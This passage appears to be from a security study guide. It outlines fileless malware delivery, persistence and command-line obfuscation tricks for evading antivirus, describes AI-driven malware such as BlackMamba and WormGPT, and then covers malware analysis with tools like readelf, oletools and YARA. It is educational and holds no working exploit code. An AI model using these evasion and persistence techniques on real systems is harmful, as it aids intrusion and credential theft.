			- Attackers can inject malicious payloads into running memory (RAM) to target legitimate processes without leaving traces. This type of intrusion is difficult to detect by antivirus software, as the payload is executed directly from memory rather than stored on local disks. Attackers exploit APIs and Windows admin tools like WMI, PSExec, and PowerShell to access process memory, often using reflective Dynamic Link Library (DLL) methods to load malicious scripts into host processes while avoiding writing DLLs to disk.\
			- EternalBlue is an in-memory exploit that targets vulnerabilities in the Windows SMB 1 protocol, enabling attackers to access services and applications. The attacker then targets the lsass.exe file, which handles user authentication and other critical operations. By injecting malicious code into lsass.exe, attackers can launch further attacks while evading detection, often using tools like Mimikatz to extract credentials from memory.
		- Launching Fileless Malware through Script-based Injection:
			- Fileless attacks use scripts that embed, obfuscate, and compile binaries and shellcode to avoid creating files on disk. These scripts enable attackers to infect applications or operating systems without being traced, and can identify design flaws or vulnerabilities. Scripts are flexible and can be executed from any file or directly from memory.
			- Attackers exploit this flexibility and system vulnerabilities to inject malicious scripts into memory via PowerShell, evading detection. Once in control, they can run scripts remotely through a command-line interface to spread infections and initiate other malicious activities. Threats like KOVET, POWMET, and FAREIT have used malicious scripts for such attacks.
		- Launching Fileless Malware by Exploiting System Admin Tools:
			- The attacker exploits default system admin tools, features, and utilities to spread fileless infections. They use tools like Certutil and Windows Management Instrumentation Command (WMIC) to steal information, as well as command-line utilities such as Regsvr32 and Rundll32 to execute malicious DLLs. These exploited command lines allow the attacker to install modified penetration testing tools, gaining full access to the target system. These tools are used to access payloads, maintain persistence, steal and export data, and expand malware. Since these tools appear legitimate, they can evade detection by traditional antivirus software.
			- Attackers can exploit system tools such as remote desktop utilities, command-line tools like Regsvr32, PowerShell, Rundll32, CertUtil, and WMIC, along with penetration testing tools like Mimikatz and Cobalt Strike. This technique enables attackers to steal critical information, such as credentials, and use it to launch further attacks.
		- Launching Fileless Malware through Phishing:
			- Attackers often use social engineering techniques, such as phishing, to spread fileless malware to target systems. They send spam emails with malicious links, and when the victim clicks on the link, they are directed to a fraudulent website that automatically loads Flash and triggers the exploit. Additionally, the fileless malware scans the target system for vulnerabilities in system tools like PowerShell, WMI, and browser Java plug-ins. Once a vulnerability is identified, the malware exploits it to download and execute a malicious payload, compromising sensitive information stored in the process memory. Fileless threats can also maintain persistence by creating AutoStart registry entries, depending on the attacker’s goals.
		- Launching Fileless Malware through Windows Registry:
			- Modifying the ExecutionPolicy settings in the registry to "unrestricted" or "bypass" can enable the execution of malicious scripts. Attackers can exploit these vulnerabilities to deploy fileless malware on targeted systems. For instance, they may use malware like Kovter to execute malicious scripts through registry modifications, allowing them to bypass standard security measures, including antivirus software. The malware also exploits the mshta.exe Windows binary through registry changes to run the malicious script.
			- The malware creates multiple registry entries containing encoded JavaScript, which is executed by another registry entry that incorporates mshta and the JavaScript ActiveXObject. This method uses wscript.shell to run the encoded script, making it a sophisticated technique for launching fileless attacks.
	- Maintaining Persistence with Fileless Techniques:
		- Once malware infiltrates a system, server, or network, it can remain undetected for extended periods. Unlike traditional malware, fileless malware does not rely on disk files to spread or maintain its presence. Instead, attackers use unique methods to ensure persistence:
		- Registry Persistence: Attackers store the malicious payload in the system registry, which holds configuration data, application files, and settings. Once the malicious code is loaded into specific registry keys, it executes automatically during system restarts or when certain shortcuts are clicked.
		- Task Scheduler Exploitation: Attackers can exploit the Windows Task Scheduler to activate malicious scripts at specific times. These scheduled tasks run malware from the registry at regular intervals, helping it spread infections within the system.
		- WMI Exploitation: Attackers can also leverage Windows Management Instrumentation (WMI), which is designed to manage systems and devices on a network. By storing malicious scripts in the WMI repository, attackers can later execute them using WMI utilities, maintaining persistence without relying on traditional file storage.
	- Fileless Malware:
		- LODEINFO:
			- LODEINFO is a fileless malware that enables attackers to remotely control infected hosts without detection by security solutions. The infection begins with phishing emails containing malicious Microsoft Word documents. When opened, the document triggers VBA macros that launch downloader shellcode, which executes the LODEINFO implant.
			- LODEINFO uses remote template injection to fetch and execute malicious macros hosted on the attacker’s server each time the victim opens the Word document with the template. The shellcode downloader retrieves a file disguised as a privacy-enhanced mail (PEM) from a C2 server, which loads the backdoor directly into memory. The downloader shares similarities with the known fileless downloader DOWNIISSA, using a self-patching mechanism, encoded C2 server data, and a structure to decrypt the fake PEM file. This method allows the malware to evade security controls and maintain persistent access for malicious operations.
		- Additional Fileless Malware: Fileless Revenge RAT, Divergent, DarkWatchman, HeadCrab 2.0, BazarBackdoor, Astaroth, Nodersok, Vaporworm, Sodinokibi Ransomware, Kovter and Poweliks, Dridex, Sorebrect Ransomware
	- Fileless Malware Obfuscation Techniques to Bypass Antivirus:
		- Inserting Characters : Attackers insert special characters, such as commas (,) and semicolons (;), between malicious commands and strings to make well-known commands harder to detect. These characters are treated as whitespace in command-line arguments, allowing the commands to be processed without issue. This technique helps attackers break up malicious strings, evading detection by signature-based security solutions.
		- Inserting Parentheses : In general, parentheses are used to improve code readability, group complex expressions, and split commands. When parentheses are used, the variables within a code block are treated and evaluated as part of a single-line command. Attackers exploit this feature to split and obfuscate malicious commands, making them harder to detect.
		- Inserting Caret Symbol : The caret symbol (^) is typically used in shell commands for escaping characters. Attackers exploit this feature by inserting single or double caret symbols within a malicious command to escape parts of the command during execution, helping to evade detection.
		- Inserting Double Quotes : When a command is enclosed in double quotes, it does not affect the normal execution of the command. Additionally, the command-line parser treats the double quote symbol as an argument delimiter. Attackers exploit this by using double quotes to concatenate malicious commands within arguments.
		- Using Custom Environment Variables : Another method attackers use to obfuscate fileless malware is by exploiting environment variables. In Windows, environment variables are dynamic objects that store modifiable values used by applications at runtime. Attackers leverage environment variables to split malicious commands into multiple strings and set their values at runtime to execute the malicious commands.
		- Using Pre-assigned Environment Variables : Another technique used by attackers involves retrieving specific characters from pre-assigned environment variables, such as "%CommonProgramFiles%." Attackers refer to the characters in these variables by their index and exploit them to execute malicious commands.
- AI-based Malware
	- AI-based malware leverages artificial intelligence (AI) techniques and algorithms to enhance its functionality and achieve its objectives. Using sophisticated algorithms, AI malware autonomously infiltrates target systems, evades detection mechanisms, and executes malicious payloads with unmatched speed and precision.
	- Working of AI-based Malware:
		- Infiltration: This is the initial phase where AI malware gains access to the target system. It infiltrates the system through phishing emails, misconfigured devices, or by leveraging existing malware.
		- Establishment: In this phase, the malware secures a foothold on the target system by exploiting vulnerabilities or using advanced evasion techniques.
		- Learning Phase: During this phase, AI malware gathers data about the target system, network, behavior, and security mechanisms to understand the environment and identify potential obstacles.
		- Adaptation: In this phase, the AI malware modifies its source code based on insights from the learning phase to bypass antivirus software and adapts its strategies to achieve its objectives.
		- Execution: In this phase, the malware carries out its intended actions, such as data theft, encryption, or creating backdoors.
		- Propagation: During this phase, AI malware spreads to other systems within the network or across the internet by identifying and exploiting vulnerable systems or using social engineering methods.
		- Evolution: In this phase, the malware evolves into a more sophisticated form by adapting to the changes encountered in the target system during the previous phases.
	- Techniques Used in AI-based Malware Development:
		- Generative Adversarial Networks (GANs):
			- Generative adversarial networks (GANs) have emerged as a powerful tool in AI, particularly for generating new data that resembles, yet remains distinct from, the data on which they were trained.
		- Reinforcement Learning:
			- Reinforcement learning is used to develop or modify AI malware by adding new features. For example, the results generated by the GAN above can be saved as RL_Features/adversarial_imports_set.pk and RL_Features/adversarial_sections_set.pk, which will then be used to incorporate imports and sections into the malware for mutation.
		- Natural Language Processing (NLP):
			- Natural language processing (NLP) is a branch of artificial intelligence focused on enabling interaction between computers and humans through natural language. The primary goal of NLP is to allow computers to understand, interpret, and generate human languages in a meaningful way. While NLP has numerous beneficial applications, such as improving accessibility and automating customer service, it can also be exploited for malicious purposes, including the development of AI-based malware.
			- The following are different ways attackers utilize NLP in the development of malware:
				- Sophisticated Phishing Attacks : Using NLP, cyber attackers can automate the creation of convincing phishing emails that closely mimic legitimate communications.
				- Context-aware Malware : NLP enables malware to analyze and extract sensitive information from documents and conversations on infected devices more effectively.
				- Automated Social Engineering : NLP allows malware to automate social engineering attacks through chatbots or systems that interact directly with victims.
				- Sentiment Analysis for Targeting : Sentiment analysis can help identify potential victims for social engineering attacks by evaluating social media posts.
				- Evasion Techniques : NLP enables malware to evade detection by understanding and responding to security analysis techniques.
				- Command and Control Communications : NLP can enhance the sophistication of command and control (C&C) communications between infected devices and attackers.
				- Deepfake Generation for Scams : NLP and AI can be used to create deepfakes, impersonating authority figures to trick victims into revealing information or downloading malware.
	- AI-based Malware:
		- FakeGPT:
			- The FakeGPT malware campaign involves a malicious Chrome extension that mimics ChatGPT, distributed through phishing and misleading ads to trick users into downloading it from unofficial sources.
			- Once installed, the malware gains unauthorized access to the user's Facebook account, targeting the ad management section. This allows attackers to steal sensitive information, take control of ad accounts, and run fraudulent ads, resulting in financial losses and reputational damage. By leveraging the trust associated with ChatGPT, attackers monetize compromised accounts and divert funds to their campaigns, with the malware's disguise as a legitimate AI tool making detection difficult.
		- BlackMamba:
			- BlackMamba is an AI-generated polymorphic malware designed to infiltrate and exploit target environments. It uses a large language model (LLM) to create a polymorphic keylogger, obfuscate its actions, and establish encrypted channels for data exfiltration and command server communication. The malware evades traditional security measures, such as firewalls and antivirus software, and collects user keystrokes, which are compressed and sent to the attacker's C2 server in small fragments.
			- The attacker can gather sensitive data, including usernames, passwords, and credit card details, which is then analyzed with AI algorithms for further exploitation, such as spear phishing. Additionally, the data may be sold on the dark web, enabling the installation of more malware, data theft, or ransomware attacks on other systems in the network.
		- WormGPT:
			- WormGPT is an AI-based chatbot built on the open-source GPT-J LLM, capable of interpreting and responding to natural language text. It assists attackers in creating convincing, personalized fake emails to deceive users. Attackers can input prompts to generate human-like responses, which are used to lure victims into revealing sensitive information or sending money. The generated emails impersonate trusted business contacts, making them highly convincing.
			- For example, WormGPT's business email compromise (BEC) capabilities are trained on diverse datasets, including confidential malware-related data. The malware crafts emails with exceptional grammatical accuracy, enabling spear phishing attacks on targeted organizations.
		- FraudGPT:
			- FraudGPT is a malicious AI-driven tool similar to ChatGPT but designed to produce deceptive content for malicious purposes. It is trained on a massive dataset of text and code selected for illegal activities, allowing it to learn patterns used in fraud. Attackers can use FraudGPT to generate convincing phishing emails, social engineering tactics, cracking tools, engage in carding, identify vulnerabilities, and more.
			- Attackers can also use FraudGPT to create new adversarial variants tailored for various cybercriminal activities, operating without ethical constraints. This tool is available for purchase on Dark Web marketplaces and through Telegram platforms.
		- AI-Generated Videos: Malware Spread Through YouTube:
			- Attackers use AI-generated video tools like Synthesia and D-ID to create human-like personas and exploit trust. They masquerade as software tutorial creators, offering cracked versions of popular software such as Photoshop, Autodesk 3ds Max, and AutoCAD.
			- In the video description, they include links to "free" versions of the software, which, when clicked, install stealer malware such as Vidar, RedLine, or Raccoon. These malware variants infiltrate the system and extract sensitive data, including usernames and passwords. The stolen data is analyzed using AI on the C2 server for further attacks.
		- Stuxnet
		- DeepLocker
		- Mylobott
- Malware Analysis
	- Malware analysis is the process of reverse engineering a specific piece of malware to determine its origin, functionality, and potential impact.
	- Analyzing malware on production devices connected to production networks is highly dangerous. Therefore, malware samples should always be analyzed in a controlled testing environment with an isolated network to prevent potential harm.
	- Sheep Dip Computer:
		- A Sheep Dip Computer is a dedicated, standalone system used for scanning and analyzing external storage devices, software, or files for malware before they are introduced into a secure network or environment. This system acts as an isolated checkpoint to prevent malicious software from compromising critical systems.
		- A computer used for sheep dipping should be equipped with tools such as port monitors, file monitors, network monitors, and one or more antivirus programs to perform malware analysis on files, applications, incoming messages, and external hardware devices (such as USB drives and other portable storage media).
		- Antivirus Sensor Systems: An antivirus sensor system is a suite of computer software designed to detect and analyze malicious code threats, including viruses, worms, and Trojans. It is commonly used in conjunction with sheep dip computers to enhance malware detection and prevention capabilities.
	- Types of Malware Analysis:
		- Static Malware Analysis:
			- This process is also known as code analysis and involves examining the executable binary code without executing it to gain a deeper understanding of the malware and its purpose. General static analysis entails evaluating the malware without running its code or instructions.
			- The process employs various tools and techniques to identify the malicious components of a program or file. Additionally, it gathers information about the malware's functionality and collects technical indicators or simple signatures generated by the malware.
		- Dynamic Malware Analysis:
			- This process is also known as behavioral analysis and involves executing the malware code to understand how it interacts with the host system and its impact after infection.
			- Dynamic analysis entails running the malware to observe its behavior and operations, identifying technical signatures that confirm its malicious intent. It reveals critical information such as domain names, file path locations, created registry keys, IP addresses, additional files, installation files, DLLs, and associated files present on the system or network.
	- Malware Analysis Procedure:
		- Preparing Testbed:
			- Requirements to Build Testbed:
				- An isolated test network to host testbed, along with isolated network services such as DNS.
				- Target machines with various operating systems and configuration states (e.g., non-patched, patched, etc.).
				- Virtualization snapshots and re-imaging tools to quickly wipe and rebuild target machines.
				- Tools are required for testing:
					- Imaging tool: Used to create a clean image for forensics and prosecution purposes.
					- File/data analysis tools: Used to perform static analysis of potential malware files.
					- Registry/configuration tools: Malware often infects the Windows registry and other configuration settings. These tools help identify the last saved settings.
					- Sandbox: Used for performing dynamic analysis manually.
					- Log analyzers: Devices under attack record malware activities and generate log files. These tools are used to extract and analyze those log files.
					- Network capture tools: Used to monitor and understand how the malware exploits the network.
			- Steps to prepare Testbed:
				- Step 1: Allocate a physical system to serve as the analysis lab.
				- Step 2: Install a virtual machine (e.g., VMware, Hyper-V, etc.) on the system.
				- Step 3: Install a guest operating system (OS) on the virtual machine(s).
				- Step 4: Isolate the system from the network by setting the network interface card (NIC) to "host-only" mode.
				- Step 5: Simulate internet services using tools like INetSim.
				- Step 6: Disable features such as "shared folders" and "guest isolation" to enhance security.
				- Step 7: Install malware analysis tools on the guest OS.
				- Step 8: Generate the hash value for each OS and tool to ensure their integrity.
				- Step 9: Copy the malware sample to the guest OS for analysis.
		- Static Analysis:
			- Static analysis is the process of examining an executable file without running or installing it. This makes static analysis relatively safe, as the investigator does not need to execute or install the suspicious file.
			- However, some malware can perform malicious activities without needing installation. Therefore, investigators should always conduct static analysis in a controlled environment.
			- This method uses various tools and techniques to quickly determine whether a file is malicious. Analyzing the binary code provides insights into the malware’s functionality, network signatures, exploit packaging techniques, dependencies, etc.
			- Static Malware Analysis Techniques:
				- File Fingerprinting:
					- File fingerprinting is the process of computing the hash value of a given binary code and using it to uniquely identify malware or periodically verify whether any changes have been made to the binary code during analysis. Tools like HashMyFiles can be used to calculate various hash values for the malware file.
					- File Fingerprinting Tools:
						- HashMyFiles : HashMyFiles generates hash values (MD5, SHA-1, CRC32, SHA-256, SHA-512, SHA-384) and provides file details such as full path, creation/modification dates, file size, attributes, version, and extension for searching and comparison.
						- Hashing (github.com)
						- SHA-256 hash calculator (xorbin.com)
						- Hash Tool (www.digitalvolcano.co.uk)
						- MD5sums (www.pc-tools.net)
						- tools4noobs - Online hash calculator (www.tools4noobs.com)
				- Local and Online Malware Scanning:
					- Scan the binary code locally using well-known and up-to-date antivirus software. If the code under analysis is a component of a well-known malware, it may already have been discovered and documented by antivirus vendors. Alternatively, the code can be uploaded to online services like VirusTotal for scanning by a wide range of antivirus engines.
					- Local and Online Malware Scanning Tools:
						- VirusTotal : VirusTotal is a free service that analyzes suspicious files and URLs, detecting threats like viruses, worms, and Trojans. It provides a report showing the number of engines marking the file as malicious, the malware name, and additional details such as the target machine, compilation timestamp, file type, compatible processors, entry point, PE sections, DLLs, PE resources, hash values, accessed IP addresses, program code, and established connections.
						- Any.Run (app.any.run) 
						- Hybrid Analysis (www.hybrid-analysis.com) 
						- JOESandbox Cloud (www.joesandbox.com) 
						- Jotti (virusscan.jotti.org) 
						- Valkyrie Sandbox (valkyrie.comodo.com) 
						- Online Scanner (www.fortiguard.com)
				- Performing Strings Search:
					- Software programs often include strings that serve as commands for specific functions, such as printing output or conveying information to users. In some cases, these strings can reveal malicious intent, such as accessing internal memory or cookie data, which may be embedded in the compiled binary code. Analyzing embedded strings in an executable file can expose readable text, including status updates, error messages, or other clues about the program's basic functionality.
					- In malware analysis, searching for malicious strings can help identify the harmful actions a program might perform. For example, if a program accesses a URL, the corresponding URL string will often be stored within it. It is essential to remain vigilant when examining strings and to also search for embedded and encrypted strings to detect suspicious files. Tools like BinText can be used to extract these embedded strings from executable files, aiding in the analysis process.
					- String Searching Tools:
						- BinText Source : BinText is a text extractor that can retrieve text from any file. It can detect plain ASCII text, Unicode text, and resource strings, providing valuable information for each item.
						- FLOSS (github.com)
						- Strings (learn.microsoft.com)
						- Free EXE DLL Resource Extract (resourceextract.com)
						- FileSeek (www.fileseek.ca)
						- Hex Workshop (www.hexworkshop.com)
				- Identifying Packing/Obfuscation Methods:
					- Attackers often use packers to compress, encrypt, or modify a malware executable to avoid detection. Obfuscation techniques also conceal the execution of the program. When the user runs a packed program, it first executes a small wrapper to decompress the packed file and then runs the unpacked file.
					- This process complicates reverse engineering, making it more difficult to uncover the program's logic and metadata through static analysis. Tools like PEiD can help detect common packers, cryptors, and compilers used for PE executable files. Identifying the packer simplifies the task of choosing the appropriate tool for unpacking the code.
					- Packaging/Obfuscation Tools:
						- Detect It Easy (DIE) : DIE is an application used to determine the types of files. In addition to Windows, it is available for Linux and macOS. With its open architecture for signatures, users can easily add custom algorithms for detecting or modifying existing signatures. DIE detects a file's compiler, linker, packer, and more using a signature-based detection method.
						- PEiD : PEiD is a free tool that provides details about Windows executable files. It can identify signatures associated with over 600 different packers and compilers. The tool also displays information about the type of packer used to pack the program, along with additional details such as the entry point, file offset, EP section, and the subsystem used for packing.
						- Macro_ Pack (github.com)
						- UPX (upx.github.io)
						- ASPack (www.aspack.com)
						- VMprotect (vmpsoft.com)
						- ps2-packer (github.com)
				- Finding Portable Executables (PE) Information:
					- The Portable Executable (PE) format is an executable file format used by Windows OS, storing the information required by the system to manage executable code. It contains metadata that helps reveal additional details about the file.
					- Analyzing the metadata of PE files (the Windows binary in PE format) provides information such as creation and modification times, import and export functions, compilation time, DLLs, linked files, strings, menus, and symbols. The PE format includes a header and sections that store metadata about the file and its code mapping within the OS. Tools like PE Explorer can be used to extract this information.
					- The PE file format contains the following sections:
						- .text: Contains the instructions and program code executed by the CPU.
						- .rdata: Stores import and export information, along with other read-only data used by the program.
						- .data: Holds the program's global data, accessible by the system from anywhere.
						- .rsrc: Contains resources used by the executable, such as icons, images, menus, and strings, and provides support for multiple languages.
					- PE Extraction Tools:
						- PE Explorer : PE Explorer allow to open, view, and edit various 32-bit Windows executable file types (also called PE files), including common types like EXE, DLL, and ActiveX Controls, as well as less familiar types such as SCR (Screensavers), CPL (Control Panel Applets), SYS, MSSTYLES, BPL, DPL, etc.
						- Portable Executable Scanner (pescan) (tzworks.net)
						- Resource Hacker (www.angusj.com)
				- Identifying File Dependencies:
					- Software programs rely on various inbuilt libraries of the operating system to perform specific actions. To function correctly, programs often need to interact with internal system files. File dependencies provide information about the system files required by the program, including the process of registration and their locations on the machine. Identifying these dependencies is crucial, as they contain information about the runtime requirements of an application and may offer insights into potential malware within the file.
					- File dependencies include linked libraries, functions, and function calls. By checking the dynamically linked list in a malware executable, it is possible to determine the libraries and functions the program uses, which can help estimate its behavior. Understanding the various DLLs used to load and run the program is essential. Tools like DependencyWalker can help identify the dependencies within an executable file.
					- List of Standard dlls:
						- Kernel32.dll : Core functionality, such as access and manipulation of memory, files, and hardware
						- Advapi32.dll : Provides access to advanced core Windows components such as the Service Manager and Registry
						- User32.dll : User-interface components, such as buttons, scrollbars, and components for controlling and responding to user actions
						- Gdi32.dll : Functions for displaying and manipulating graphics
						- Ntdll.dll : Interface to the Windows kernel
						- WSock32.dll / Ws2_32.dll : Networking DLLs that help to connect to a network or perform network-related tasks
						- Wininet.dll : Supports higher-level networking functions
					- Dependency Extraction Tools:
						- Dependency Walker : Dependency Walker lists all the dependent modules of an executable file and builds hierarchical tree diagrams. It also records all the functions exported by each module and tracks their calls. Additionally, it detects common application issues such as missing or invalid modules, import/export mismatches, circular dependency errors, mismatched machine modules, and module initialization failures.
						- Dependency-check (jeremylong.github.io)
						- Dependency Finder (depfind.sourceforge.io)
						- PE Explorer Dependency Scanner (www.pe-explorer.com)
						- RetireJS (retirejs.github.io)
				- Malware Disassembly:
					- Static analysis also involves dismantling an executable into its binary format to study its functionalities and features. Disassembling the binary code allows for the analysis of the assembly code instructions. This process helps identify the programming language used for the malware, as well as the APIs that reveal its functionality.
					- Tools like IDA can reverse machine code into assembly language. Once the assembly code is reconstructed, the program's logic can be inspected to assess its threat potential. This analysis is often performed using debugging tools such as OllyDbg.
					- Disassembling and Debugging Tools:
						- IDA Pro : IDA Pro is a multi-platform disassembler and debugger used to explore binary programs when the source code is not available, creating maps of their execution. It displays instructions in the same way a processor executes them, using a symbolic representation called assembly language. This makes it easier to identify harmful or malicious processes.
						- Ghidra (ghidra-sre.org)
						- x64dbg (x64dbg.com)
						- Radare2 (rada.re)
						- OllyDbg (www.ollydbg.de)
						- WinDbg (www.windbg.org)
				- Analyzing ELF Executable Files:
					- ELF (Executable and Linkable Format) is a generic executable file format used in Linux. It consists of three main components: an ELF header, sections, and segments, each playing an independent role in the loading and execution of ELF executables. Static analysis of an ELF file involves examining the file without running or installing it. This process includes accessing the binary code and extracting valuable artifacts from the program. The results of the analysis help determine whether the file is malicious.
					- If the ELF file is identified as malicious, the information extracted during static analysis may be insufficient to fully understand the behavior and purpose of the malware, necessitating further dynamic analysis in a secure or isolated environment.
					- Static Analysis of ELF Files Using readelf:
						- The readelf tool displays information about one or more ELF object files. Options control what information is displayed. The tool supports both 32-bit and 64-bit ELF files. Security professionals can use readelf to extract static artifacts from an ELF executable.
						- Identifying Symbols in ELF Executables:
							- Extracting symbols is the process of retrieving data types such as functions and variables used in the source code. These symbols provide insight into the functions and variables implemented by the developers, helping to understand the code's functionality.
							- Extract Symbols from ELF Executable: readelf -s <malware_sample>
						- Identifying Program Headers in ELF Executables:
							- The program headers in an ELF executable reveal the memory layout of the binary code. They help determine whether the ELF executable file is properly packed. To view this information, the readelf tool can be used with the -l option, followed by the ELF executable file name.
							- Retrieve ELF Program Headers: readelf -l <malware_sample>
						- Identifying ELF File Headers:
							- The ELF executable file header contains general information, such as the binary's entry point, program headers, and table locations. This data helps determine the file's architecture and the machine for which it is designed to run.
							- Retrieve Information Contained in ELF File Header: readelf --file-header <malware_sample>
						- Extracting Strings from ELF Executable Files:
							- String extraction involves collecting vital information from a suspected ELF executable file. Strings such as symbols, section names, and function names reveal the purpose of the binary code. Linux includes a default command called strings, which extracts these strings and saves them in a .txt file.
							- Extract Strings from ELF Executable File: strings malware_sample > str.txt
						- Analyzing String Reuse Using Intezer:
							- Intezer is a malware analysis platform that scans files, URLs, endpoints, and memory dumps. It extracts strings from uploaded malware samples and identifies whether those strings are used in other files. By analyzing unknown malware that is difficult to trace, it reduces the effort required by malware analysts.
				- Analyzing Mach-O Executable Files:
					- The Mach Object (Mach-O) file format is an executable file format analogous to the Portable Executable (PE) format for Windows and the Executable and Linkable Format (ELF) for Linux. It is primarily associated with binaries used in macOS and iOS. This file format is employed to distribute executable code and defines how memory interacts with the data and code contained within a binary file.
					- Mach-O malware can directly impact a program’s performance, as memory usage and paging activities are influenced by the arrangement of code within the binary. This type of malware enables attackers to create overlapping memory arrays and assign specific memory locations for executing a Mach-O executable. By exploiting these mechanisms, attackers can achieve privilege escalation and exploit subsequent vulnerabilities, potentially gaining root access.
					- Malicious Mach-O Binaries:
						- Mach-O is a binary format consisting of byte streams organized into meaningful data chunks, such as CPU type, data size, and byte order. It is structured into segments like __PAGEZERO, __TEXT, __DATA, and __OBJC, each containing specific types of code or data. Attackers may exploit these segments to conceal and execute malicious code for privilege escalation.
						- To mitigate such threats, security analysts should analyze Mach-O malware and implement protective measures. Tools like pagestuff, LIEF, and otool can aid in detecting and preventing privilege escalation in macOS systems.
					- Reverse Engineering Mach-O Binaries:
						- Mach-O binaries consist of various segments and their corresponding sections, making it essential for security analysts to evaluate the internal structure of a binary to identify malicious code. Additionally, reverse engineering can be employed to examine all methods and executable files within these segments, helping to mitigate potential threats. Tools like Hopper Disassembler are useful for analyzing Mach-O binary files.
					- Tools:
						- LIEF (lief-project.github.io):
							- LIEF, short for Library to Instrument Executable Formats, is a cross-platform tool developed by QuarksLab for parsing and manipulating various executable formats, including Mach-O binaries. It supports multiple programming languages, such as C, C++, and Python, and provides an abstraction layer for common features across different executable formats.
							- Obtain Information on Mach-O Executable:
								- import lief
								  binary = lief.parse("/usr/bin/ls")
								  print(binary)
						- otool:
							- Security analysts can use otool to analyze and examine binaries, providing detailed information about iOS applications.
							- Check Binary Links with Shared Library: otool -L UnPackNw > ~/Malware/libs.txt
							- Dump Method Names from Obj Section of Mach-O Binary: otool -oV UnPackNw > ~/Malware/methods.txt
							- Acquire Disassembly to Find Obfuscated File Name: otool -tV UnPackNw > ~/Malware/disassembly.txt
						- Hopper Disassembler:
							- Hopper Disassembler is a reverse engineering tool that enables security analysts to disassemble, decompile, and debug application binaries. It analyzes function prologues to extract procedural information, including basic blocks and local variables. By integrating with LLDB or GDB debuggers, Hopper facilitates reverse engineering and dynamic analysis of Mach-O binaries. The tool presents code in various representations for enhanced analysis.
						- pagestuff
				- Analyzing Malicious MS Office Documents:
					- The use of MS Office documents, such as Word documents and PowerPoint presentations, is widespread across organizations. Attackers often exploit these documents to distribute and install malware. When analyzing malware, it is crucial to understand the structure of various MS Office documents and effectively analyze any malicious files.
					- Oletools is a Python-based suite designed to analyze Microsoft OLE2 files, commonly found in MS Office documents. It enables cybersecurity professionals to extract, parse, and detect malicious content within these files. By analyzing macros, embedded objects, and metadata, Oletools identifies potentially harmful elements, such as hidden scripts or exploit code. This makes it a vital tool for uncovering and mitigating threats from malicious Office documents, frequently used in phishing attacks and malware distribution.
					- Finding Suspicious Components:
						- Use the Python-based tool oleid to analyze malicious Office documents and review components that may be classified as suspicious or malicious. The oleid tool is specifically designed for examining OLE files.
						- Shows that malicious Word document named Infected.docx contains VBA macros: python3 oleid.py ‘<path_to_suspect_document>’
					- Finding Macro Streams:
						- The next step is to parse the malicious Office document using oledump to identify streams containing macros.
						- Identify Streams Containing Macros: python3 oledump.py ‘<path_to_suspect_document>’
					- Dumping Macro Streams:
						- Extract the contents of a specific macro stream using oledump:
						- python3 oledump.py -s <stream number> <path_to_suspect_document>
					- Identifying Suspicious VBA Keywords:
						- The olevba tool can be used to view the source code of all VBA macros embedded in a document and identify suspicious VBA keywords and obfuscation techniques commonly used by malware.
						- Review the source code of all VBA macros to determine if the document contains auto-executable macros, obfuscated strings, or indicators of compromise (IOCs), such as filenames, IP addresses, or URLs. Use the following command:
						- python3 olevba.py ‘<path_to_suspect_document>
				- Analyzing Suspicious PDF Documents:
					- PDF documents are commonly used for both personal and business purposes, making them a frequent target for attackers to hide malicious scripts that execute when the document is opened. When analyzing a suspicious PDF file, it is important to perform scans using various tools to determine if it contains malicious scripts. Extract these scripts to assess their potential impact on the system and network.
					- To identify potentially malicious elements in PDF files, tools like PDFiD can scan for specific keywords and object types commonly associated with exploits. Additionally, tools such as PDFStreamDumper allow for deeper analysis, including the inspection and extraction of streams and objects within a PDF.
					- Testing the File with PDFiD to Analyze PDF Keywords:
						- The tool will display the structure of the file, including its contents, such as the header, objects, and any scripts present.
						- Test the suspect PDF file with the PDFiD tool to identify any malicious components:
						- python3 pdfid.py '<path_to_suspect_PDF_file>'
					- Finding Suspicious Objects with PDFStreamDumper:
						- Tools like PDFStreamDumper can be used to explore the internal elements of a suspect PDF file, including objects, streams, and embedded obfuscated scripts. After opening the file in PDFStreamDumper, review the objects one by one along with their stream details to identify any malicious components.
						- The analysis of the fifth object in the infected.pdf file using PDFStreamDumper reveals that it contains a JavaScript header, with its data stream starting in the sixth object. Scanning the sixth object for readable strings, as shown in the screenshot below, indicates the use of the util.printf() function, which can display gathered system data.
					- Scanning the File for Exploits:
						- Scan the suspect PDF file for any potential exploits using the PDFStreamDumper tool. To do this, click the Exploits_Scan button in the toolbar. The tool will then compare the file against a set of known PDF exploit signatures and generate the results in a Notepad file.
				- Analyzing Suspicious Documents Using YARA:
					- YARA (Yet Another Recursive Acronym) is a powerful tool used to identify and classify malware samples. It allows users to create rules that describe patterns of interest in files, such as specific strings, binary sequences, or combinations of characteristics commonly found in malware. These rules are then used to scan files and detect matches, indicating the presence of malicious content.
					- Key features of YARA include its ability to perform both string and binary pattern matching, support for complex conditions and Boolean expressions, and the capability to scan files, directories, and even memory. The tool is highly flexible and can be integrated into various security workflows and automation scripts, making it an essential asset for malware analysis and other cybersecurity operations.
					- Structure of YARA Rules:
						- A YARA rule is structured with specific sections, including the rule header, metadata, strings, and conditions.
						- Rule Header: This section includes the rule's name and optional tags.
						- Metadata: This section is optional and can include key-value pairs that provide additional information about the rule.
						- Strings: This section defines the strings to search for in the files. Strings can be text, hexadecimal, or regular expressions.
						- Condition: This section defines the logic that must be met for the rule to match. It typically involves checking whether one or more of the defined strings are present in the file.
		- Dynamic Analysis:
			- In dynamic analysis, malware is executed in a controlled environment to understand its behavior after infection. This type of analysis requires a safe environment, such as virtual machines and sandboxes, to prevent the malware from spreading. The environment should be designed with tools that can capture every action of the malware in detail and provide relevant feedback. Virtual systems are typically used as the foundation for conducting these experiments.
			- Dynamic analysis is performed to gather valuable information about the malware's activity, such as files and folders created, ports and URLs accessed, functions and libraries called, applications and tools used, information transferred, settings modified, and processes and services started.
			- The environment for dynamic analysis should be set up in a way that prevents malware from propagating to the production network and ensures that the testing system can be restored to a previous state if anything goes wrong during the test.
			- Dynamic Analysis Consists of Two Stages:
				- System Baselining:
					- Baselining refers to the process of capturing the system's state (taking a snapshot) at the beginning of the malware analysis, which can later be compared with the system's state after executing the malware. The main purpose of system baselining is to identify significant changes from the baseline state, helping to understand the impact the malware has had on the system.
					- System baselining involves recording details such as the file system, registry, open ports, network activity, and other relevant system information.
				- Host Integrity Monitoring:
					- Host integrity monitoring is the process of studying changes that occur across a system or machine after a series of actions or incidents. It involves taking snapshots of the system before and after the event using the same tools, then analyzing the changes to evaluate their impact on the system and its properties.
